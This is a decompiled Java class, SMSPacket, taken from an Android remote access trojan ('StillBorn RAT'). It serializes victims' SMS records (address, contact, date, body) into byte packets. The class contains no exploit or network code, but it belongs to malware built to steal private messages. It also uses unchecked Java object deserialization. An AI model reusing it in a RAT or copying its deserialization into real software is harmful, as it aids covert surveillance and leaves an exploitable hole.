/*   1:    */ package Packet;
/*   2:    */ 
/*   3:    */ import java.io.ByteArrayInputStream;
/*   4:    */ import java.io.ByteArrayOutputStream;
/*   5:    */ import java.io.IOException;
/*   6:    */ import java.io.ObjectInputStream;
/*   7:    */ import java.io.ObjectOutputStream;
/*   8:    */ import java.io.Serializable;
/*   9:    */ 
/*  10:    */ public class SMSPacket
/*  11:    */   implements Packet, Serializable
/*  12:    */ {
/*  13:    */   private static final long serialVersionUID = 6169284240601506961L;
/*  14:    */   private int id;
/*  15:    */   private int thread_id;
/*  16:    */   private String address;
/*  17:    */   private int person;
/*  18:    */   private long date;
/*  19:    */   private int read;
/*  20:    */   private int type;
/*  21:    */   private String body;
/*  22:    */   
/*  23:    */   public SMSPacket() {}
/*  24:    */   
/*  25:    */   public SMSPacket(int id, int thid, String ad, int pers, long dat, int read, String body, int type)
/*  26:    */   {
/*  27: 51 */     this.id = id;
/*  28: 52 */     this.thread_id = thid;
/*  29: 53 */     this.address = ad;
/*  30:    */     
/*  31: 55 */     this.person = pers;
/*  32: 56 */     this.date = dat;
/*  33: 57 */     this.read = read;
/*  34: 58 */     this.body = body;
/*  35:    */     
/*  36: 60 */     this.type = type;
/*  37:    */   }
/*  38:    */   
/*  39:    */   public byte[] build()
/*  40:    */   {
/*  41:    */     try
/*  42:    */     {
/*  43:103 */       ByteArrayOutputStream bos = new ByteArrayOutputStream();
/*  44:104 */       ObjectOutputStream out = new ObjectOutputStream(bos);
/*  45:105 */       out.writeObject(this);
/*  46:106 */       return bos.toByteArray();
/*  47:    */     }
/*  48:    */     catch (IOException e) {}
/*  49:108 */     return null;
/*  50:    */   }
/*  51:    */   
/*  52:    */   public void parse(byte[] packet)
/*  53:    */   {
/*  54:113 */     ByteArrayInputStream bis = new ByteArrayInputStream(packet);
/*  55:    */     try
/*  56:    */     {
/*  57:116 */       ObjectInputStream in = new ObjectInputStream(bis);
/*  58:117 */       SMSPacket p = (SMSPacket)in.readObject();
/*  59:118 */       this.id = p.id;
/*  60:119 */       this.thread_id = p.thread_id;
/*  61:120 */       this.address = p.address;
/*  62:121 */       this.body = p.body;
/*  63:122 */       this.date = p.date;
/*  64:123 */       this.person = p.person;
/*  65:124 */       this.read = p.read;
/*  66:125 */       this.type = p.type;
/*  67:    */     }
/*  68:    */     catch (Exception localException) {}
/*  69:    */   }
/*  70:    */   
/*  71:    */   public int getType()
/*  72:    */   {
/*  73:132 */     return this.type;
/*  74:    */   }
/*  75:    */   
/*  76:    */   public void setType(int t)
/*  77:    */   {
/*  78:136 */     this.type = t;
/*  79:    */   }
/*  80:    */   
/*  81:    */   public int getId()
/*  82:    */   {
/*  83:140 */     return this.id;
/*  84:    */   }
/*  85:    */   
/*  86:    */   public int getThread_id()
/*  87:    */   {
/*  88:144 */     return this.thread_id;
/*  89:    */   }
/*  90:    */   
/*  91:    */   public String getAddress()
/*  92:    */   {
/*  93:148 */     return this.address;
/*  94:    */   }
/*  95:    */   
/*  96:    */   public int getPerson()
/*  97:    */   {
/*  98:152 */     return this.person;
/*  99:    */   }
/* 100:    */   
/* 101:    */   public long getDate()
/* 102:    */   {
/* 103:156 */     return this.date;
/* 104:    */   }
/* 105:    */   
/* 106:    */   public int getRead()
/* 107:    */   {
/* 108:160 */     return this.read;
/* 109:    */   }
/* 110:    */   
/* 111:    */   public String getBody()
/* 112:    */   {
/* 113:164 */     return this.body;
/* 114:    */   }
/* 115:    */ }


/* Location:           C:\Users\SmileyFacedHacker\Downloads\StillBorn RAT (Android)\StillBorn RAT (Android)\StillBornRAT.jar
 * Qualified Name:     Packet.SMSPacket
 * JD-Core Version:    0.7.0.1
 */